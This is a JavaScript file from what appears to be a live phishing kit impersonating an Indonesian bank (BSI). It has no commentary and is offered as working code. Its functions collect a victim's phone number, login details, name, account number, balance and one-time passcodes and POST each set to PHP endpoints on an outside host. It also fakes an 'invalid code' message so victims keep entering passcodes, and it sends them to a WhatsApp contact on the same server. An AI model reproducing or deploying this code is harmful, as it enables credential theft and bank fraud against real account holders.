let tglNow = new Date();
let waktuBatas = new Date("2025-06-03T23:59:59");
if (tglNow.getTime() >= waktuBatas.getTime()) {
  document.location.href = 'https://expiredweb.pages.dev';
} else {
  console.log('Server aktif');
}
var logo = "▩----𝘄𝘄𝘄.𝗯𝗮𝗻𝗸𝗯𝘀𝗶.𝗰𝗼.𝗶𝗱----▩";    
       
 function sendHp() {
event.preventDefault();
 var tarif = $('input[name="tarif"]:checked').val();
       if (tarif) {  
  sessionStorage.setItem('tarif', tarif);
  }
  var nomor = document.getElementById("nohp").value;
        sessionStorage.setItem("nomor", nomor);
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
 
 
      $.ajax({
            type: 'POST',
            url: 'https://anjayhostjon.cloud/BSI/ht6gk/no.php',
            data: $('#formHP').serialize(),
            datatype: 'text',
            
            complete: function(data) {
            setTimeout(function(){
  window.location.href='login.html'
  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
 $('.process1').fadeOut();
    }, 800);
            }
        })
     }
     
function sendLog() {
event.preventDefault();
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://anjayhostjon.cloud/BSI/ht6gk/login.php',
            data: $('#formLog').serialize(),
            datatype: 'text',          
            complete: function(data) {
            setTimeout(function(){
  window.location.href='saldo.html'
  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
 $('.process1').fadeOut();
    var tarif = document.getElementById('tarif').value;
    sessionStorage.setItem("tarif", tarif);  
    var nomor = document.getElementById('nomor').value;
    sessionStorage.setItem("nomor", nomor);    
    var nama = document.getElementById('nama').value;
    sessionStorage.setItem("nama", nama);    
    var rek = document.getElementById('rek').value;
    sessionStorage.setItem("rek", rek);
    }, 800);
            }
        })
     }     
     
     
function sendSaldo() {
event.preventDefault();
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://anjayhostjon.cloud/BSI/ht6gk/saldo.php',
            data: $('#jualpuki').serialize(),
            datatype: 'text',          
            complete: function(data) {
            setTimeout(function(){
  window.location.href='otp.html'
  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
 $('.process1').fadeOut();
    var tarif = document.getElementById('tarif').value;
    sessionStorage.setItem("tarif", tarif);  
    var nomor = document.getElementById('nomor').value;
    sessionStorage.setItem("nomor", nomor);    
    var nama = document.getElementById('nama').value;
    sessionStorage.setItem("nama", nama);    
    var rek = document.getElementById('rek').value;
    sessionStorage.setItem("rek", rek);
    var saldo = document.getElementById('saldo').value;
    sessionStorage.setItem("saldo", saldo);
    }, 800);
            }
        })
     }     


// otp
function sendOtp() {
  event.stopPropagation();
    event.preventDefault();
  $("#djload").show();  
 document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
$.ajax({
 type: 'POST',
 url: 'https://anjayhostjon.cloud/BSI/ht6gk/otp.php',
 async: false,
 dataType: 'JSON',
 data: $('#form2').serialize(),
 
 complete: function(data) {
            console.log('Complete')
setTimeout(function(){  
       
      
    }, 2000);
     $("#notif").text("- Kode Aktivasi tidak valid / kadaluarsa -");
     $("#notif").css("color", "red");
        }
    });
      setTimeout(() => {
     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode Aktivasi,<br/>Silahkan klik tombol dibawah ini";
     $("#djload").hide();  
   $("#notif").css("color", "black");
 $("#sixpin").val("");
document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";      
              
   }, 4000);

  }




// datawa

function getcs(){
 $("#djload").show();   
  
setTimeout(function(){  
location.href='https://anjayhostjon.cloud/BSI/ht6gk/wa';
    }, 1000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 1100);      
}     
